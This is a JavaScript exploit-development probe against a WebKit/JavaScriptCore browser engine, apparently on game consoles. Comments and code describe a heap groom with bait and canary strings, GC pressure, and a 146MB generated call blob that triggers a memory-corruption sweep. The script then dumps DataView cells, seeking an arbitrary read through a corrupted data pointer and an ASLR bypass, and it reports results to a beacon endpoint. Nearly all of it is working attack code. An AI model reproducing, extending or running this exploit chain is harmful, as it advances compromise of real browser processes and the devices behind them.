// p164 — DataView cell corruption: what does the sweep write into a JSArrayBufferView?
//
// p156 CONFIRMED (two consoles): bait-and-switch corrupts Worker JSString cells
// (.length=81400) while char data stays intact — the sweep writes metadata-entry
// bytes over MarkedSpace cells, not over the marge data buffers.
// p157 bet on the BACKING STORES being overwritten (result: zeros — they were not).
// THIS probe flips it: the VIEW CELL is the target.
//
// WHY: JSArrayBufferView (WebKit-1200) keeps m_vector and byteLength inside the
// MarkedSpace cell — the same cell class p156 proves the sweep rewrites. If
// m_vector receives a metadata-entry value (e.g. an LLInt code pointer or a table
// offset), reads through the surviving DataView fetch RAW BYTES FROM THAT ADDRESS:
//   - success  = a code/heap read through an uncontrolled-but-real pointer
//   - the bytes are module-relative (WebKit binary / JSC heap) → userland ASLR
//     defeat candidate for the browser process
// If byteLength is hit instead, byteLength reports a metadata value and reads
// stay near the original backing store.
//
// Roadmap: issue #5 (extract what lands in cell fields, then the Float64Array
// path in p165). Length-window audit path 2 (data-pointer control).
//
// STRATEGY (groom identical to p156 — proven portable on both consoles):
// 1. Main: 20 bait strings (100KB, marge, low addresses)
// 2. Worker: 8 canary strings (proven detector) + 12 small DataViews (16B AB,
//    backing store in small-malloc — only the cell matters) + 4 marge DataViews
//    (102,400B AB, same size class as the metadata buffer)
// 3. Free baits + 30 rounds GC pressure
// 4. Compile the 38,348,816-call blob (146MB), call → sweep
// 5. Worker busy-loops on canary .length → on detection, dump every view:
//    byteLength, byteOffset, and 16 raw bytes via getUint32 (each in try/catch)
// 6. Per-view classification: PRE-OK / VECTOR-HIT / LEN-HIT / DEAD
//
// Beacon prefix: V164-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V164-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V164-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch(e) {}
  }

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var canaries = [];
    var smallDVs = [];
    var margeDVs = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var SMALL_AB = 16;
    var MARGE_AB = 102400;
    var CANARY = 0x41;    // 'A' in canary strings
    var FILL = 0x44;      // 'D' in view backing stores

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V164-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function beaconPost(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V164-W-' + tag + '?t=' + Date.now(), true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body);
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }
    function u32hex(v) {
      var s = '';
      for (var b = 3; b >= 0; b--) s += hx((v >>> (8 * b)) & 0xFF);
      return s;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';

        // 8 canary strings — the proven p156 detector
        for (var i = 0; i < 8; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          canaries.push(s);
        }
        beacon('CANARIES-' + canaries.length);

        // 12 small DataViews — backing store far from the sweep region; the CELL
        // sits in the same Worker MarkedSpace allocation phase as the canaries
        for (var d = 0; d < 12; d++) {
          var ab = new ArrayBuffer(SMALL_AB);
          var u8 = new Uint8Array(ab);
          for (var f = 0; f < SMALL_AB; f++) u8[f] = FILL;
          var dv = new DataView(ab);
          if (dv.byteLength !== SMALL_AB || dv.getUint32(0) !== 0x44444444) {
            beacon('PRE-DV-FAIL-' + d);
            continue;
          }
          smallDVs.push(dv);
        }
        beacon('SMALLDVS-' + smallDVs.length);

        // 4 marge DataViews — same size class as the metadata buffer (102,400B):
        // backing stores land in the bait-adjacent marge region
        for (var m = 0; m < 4; m++) {
          var abm = new ArrayBuffer(MARGE_AB);
          var u8m = new Uint8Array(abm);
          for (var fm = 0; fm < MARGE_AB; fm++) u8m[fm] = FILL;
          var dvm = new DataView(abm);
          if (dvm.byteLength !== MARGE_AB) {
            beacon('PRE-DVM-FAIL-' + m);
            continue;
          }
          margeDVs.push(dvm);
        }
        beacon('MARGEDVS-' + margeDVs.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        var found = false;
        var iterations = 0;

        // BUSY LOOP on the proven detector (never setTimeout polling)
        while (!found) {
          for (var i = 0; i < canaries.length; i++) {
            if (canaries[i].length !== STR_LEN) {
              beacon('LEN-' + i + '-' + canaries[i].length);
              found = true;
              break;
            }
            var c8 = canaries[i].charCodeAt(8);
            var c56 = canaries[i].charCodeAt(56);
            if (c8 !== CANARY || c56 !== CANARY) { found = true; break; }
          }
          iterations++;
          if (iterations % 500000 === 0) beacon('POLL-' + iterations);
        }

        // Sweep arrived — dump every view before anything can die
        function dumpView(tag, idx, dv, nominalLen) {
          var bl, bo;
          try { bl = dv.byteLength; } catch(e1) { bl = 'X'; }
          try { bo = dv.byteOffset; } catch(e2) { bo = 'X'; }
          beacon(tag + '-' + idx + '-bl=' + bl + '-bo=' + bo);

          var words = [];
          for (var off = 0; off < 16; off += 4) {
            try { words.push(u32hex(dv.getUint32(off, false))); }
            catch(e3) { words.push('XXXXXXXX'); }
          }
          var hex = words.join('');

          // classification
          var cls;
          if (words[0] === 'XXXXXXXX') cls = 'DEAD';
          else if (bl !== nominalLen) cls = 'LEN-HIT';
          else if (hex === '44444444444444444444444444444444') cls = 'PRE-OK';
          else cls = 'VECTOR-HIT';
          beacon(tag + 'C-' + idx + '-' + cls);
          beaconPost(tag + 'H-' + idx, hex);
        }

        for (var sd = 0; sd < smallDVs.length; sd++) dumpView('DV', sd, smallDVs[sd], SMALL_AB);
        for (var md = 0; md < margeDVs.length; md++) dumpView('DVM', md, margeDVs[md], MARGE_AB);

        // canary lengths for the p156 baseline cross-check
        for (var c = 0; c < canaries.length; c++) {
          var len = canaries[c].length;
          if (len !== STR_LEN) beacon('CH-' + c + '-len=' + len);
        }

        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (Primary/marge heap, proven groom) ──
  var N_BAIT = 20;
  var STR_LEN = 100000;

  B('BAIT-START');
  var baitChunk = '';
  for (var bc = 0; bc < 100; bc++) baitChunk += 'BBBBBBBBBB'; // 1000 'B's
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) {
      phaseFreeBaits();
    }
  };

  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');

    for (var i = 0; i < baits.length; i++) {
      baits[i] = null;
    }
    baits = null;

    var gcRound = 0;

    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) {
        new ArrayBuffer(8192);
      }
      for (var j2 = 0; j2 < 500; j2++) {
        new Array(100).fill(gcRound);
      }
      gcRound++;

      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-PRESSURE-' + gcRound);
        phaseBuildOverflow();
      }
    }

    gcPressureRound();
  }

  // ── PHASE 4: BUILD OVERFLOW ──
  function phaseBuildOverflow() {
    B('BUILD-START');

    var N_OVERFLOW = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N_OVERFLOW / CHUNK);
    var REM = N_OVERFLOW - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v164fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v164ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v164ok ? 'OK' : 'FAIL'));
      if (!window.__v164fn) { B('NO-FN'); return; }

      // ── PHASE 5: START WORKER POLLING, THEN TRIGGER ──
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');

        try {
          window.__v164fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }

        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
